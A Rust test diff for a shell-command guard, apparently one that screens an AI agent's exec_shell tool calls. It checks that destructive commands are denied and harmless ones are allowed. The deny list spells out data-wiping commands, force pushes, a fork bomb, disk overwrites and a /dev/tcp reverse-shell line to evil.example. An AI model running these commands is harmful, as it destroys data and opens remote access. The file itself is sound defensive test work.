@@ -5474,16 +5474,24 @@ mod tests {
         rt.block_on(runner.load(&m)).expect("configure");
         runner.bind_core(Arc::new(PerModCtx));
 
-        for command in [
+        let deny = [
             "rm -rf /",
+            "cd / && rm -rf /",
+            "(rm -rf /)",
+            "rm -rf //",
+            "rm -rf /home/me /",
             "git push --force origin main",
+            "git push -f origin topic",
+            "git push -fu origin topic",
+            "git push --force-with-lease --force origin topic",
             "git reset --hard HEAD~3",
             ":(){ :|:& };:",
             "mkfs.ext4 /dev/sda1",
             "dd if=image.img of=/dev/sda bs=4M",
             "cat junk > /dev/nvme0n1",
             "bash -c 'exec 3<>/dev/tcp/evil.example/4444'",
-        ] {
+        ];
+        for command in deny {
             let out = rt.block_on(runner.emit(ExtensionEvent::ToolCall(ToolCallEvent {
                 id: "t".into(),
                 name: "exec_shell".into(),
@@ -5500,8 +5508,19 @@ mod tests {
         }
 
         // Benign commands abstain (deny-only, never allow) — including the
-        // benchmark idiom the dd arm explicitly spares.
-        for command in ["cargo test", "dd if=/dev/zero of=/dev/null bs=1k count=1"] {
+        // benchmark idiom the dd arm explicitly spares, an absolute path that
+        // is not the root, and the lease-checked push (the bare substrings
+        // over-matched both).
+        let benign = [
+            "cargo test",
+            "dd if=/dev/zero of=/dev/null bs=1k count=1",
+            "rm -rf /tmp/scratch",
+            "rm -rf /home/me/proj/target/debug",
+            "git push --force-with-lease origin topic",
+            "git push --force-with-lease=refs/heads/main origin topic",
+            "rm -rf /tmp/build-cache && git push --force-with-lease origin topic",
+        ];
+        for command in benign {
             let out = rt.block_on(runner.emit(ExtensionEvent::ToolCall(ToolCallEvent {
                 id: "t".into(),
                 name: "exec_shell".into(),
@@ -5516,7 +5535,41 @@ mod tests {
                 out.outcome
             );
         }
+
+        // A raising guard abstains too (fail-open), so an abstention above
+        // must come from a decision: the closure itself returns a value for
+        // every command — a denial string, or unit.
+        let callback = m
+            .registrations()
+            .iter()
+            .find_map(|reg| match reg {
+                ScriptRegistration::Guard { callback } => Some(callback),
+                _ => None,
+            })
+            .expect("reject-templates registers a guard");
+        let engine = m.engine_for_loop(|_| {});
+        let ast = m.loop_ast();
+        let sweep = deny
+            .iter()
+            .map(|c| (c, true))
+            .chain(benign.iter().map(|c| (c, false)));
+        for (command, denies) in sweep {
+            let payload = event_to_dynamic(&ExtensionEvent::ToolCall(ToolCallEvent {
+                id: "t".into(),
+                name: "exec_shell".into(),
+                input: serde_json::json!({"command": command}),
+            }));
+            let ret = callback
+                .call::<rhai::Dynamic>(&engine, &ast, (payload,))
+                .unwrap_or_else(|err| panic!("`{command}` must not raise: {err}"));
+            assert_eq!(
+                ret.clone().try_cast::<String>().is_some(),
+                denies,
+                "`{command}` -> {ret}"
+            );
+        }
     }
+
     /// reject-templates covers `task_shell_start` (the same shell under
     /// another name) and abstains cleanly when there is no command to
     /// inspect: `exec_shell_wait` carries a `task_id` only — reading its
